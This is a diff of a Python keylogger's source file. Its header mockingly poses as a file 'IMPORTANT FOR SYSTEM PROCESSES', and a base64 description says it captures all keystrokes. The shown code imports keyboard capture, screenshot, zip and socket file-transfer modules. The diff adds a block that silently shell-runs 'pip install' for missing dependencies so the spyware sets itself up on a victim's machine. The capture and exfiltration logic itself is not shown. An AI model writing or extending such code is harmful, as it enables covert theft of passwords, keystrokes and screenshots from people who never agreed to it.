@@ -4,14 +4,7 @@
 ----------------------------------------------------------------------------------------------------
 THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!
 
-Author : 00110101 00110001 00100000 00110101 00110111 00100000 00110111 00111000 
-		 00100000 00110110 01100011 00100000 00110110 00110101 00100000 00110100 00110111 
-		 00100000 00110110 01100011 00100000 00110111 01100001 00100000 00110100 00111001 
-		 00100000 00110100 00110110 00100000 00110100 01100001 00100000 00110111 00110110 
-		 00100000 00110101 01100001 00100000 00110100 00111000 00100000 00110100 01100001 
-		 00100000 00110111 00110000 00100000 00110101 01100001 00100000 00110011 00110011 
-		 00100000 00110101 00110110 00100000 00110110 01100011 00100000 00110110 00110101 
-		 00100000 00110110 00110111 00100000 00110011 01100100 00100000 00110011 01100100
+Author : Alexis Rodriguez
 
 Date : 2020-02-09
 
@@ -42,8 +35,6 @@ Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
 from pynput import keyboard
 # import module to zip files
 from zipfile import ZipFile
-# import module to grab screenshots
-import pyautogui as pygrab
 # import module to run functions at specific times
 import threading
 # import socket to initialize socket for file transfer
@@ -52,7 +43,28 @@ import socket as sck
 import os, time
 # import subprocess to execute terminal commands
 import subprocess as subp
-
+'''
+The following dependencies may not be installed by default
+so try importing them and if it fails attempt
+to download them using pythons package installer
+'''
+try:
+	import pyautogui as pygrab
+except:
+	subp.call('pip install pyautogui', shell=True)
+	# wait 30 for download to complete
+	time.sleep(30)
+	# try importing module after attempting download
+	import pyautogui as pygrab
+try:
+	from pynput import keyboard
+except:
+	subp.call('pip install pynput', shell=True)
+	# wait 30 seconds for download to complete
+	time.sleep(30)
+	# try importing module after attempting download
+	from pynput import keyboard
+	
 
 '''************************************************************'''
 ''' 					   CLASS DEFINITION                    '''
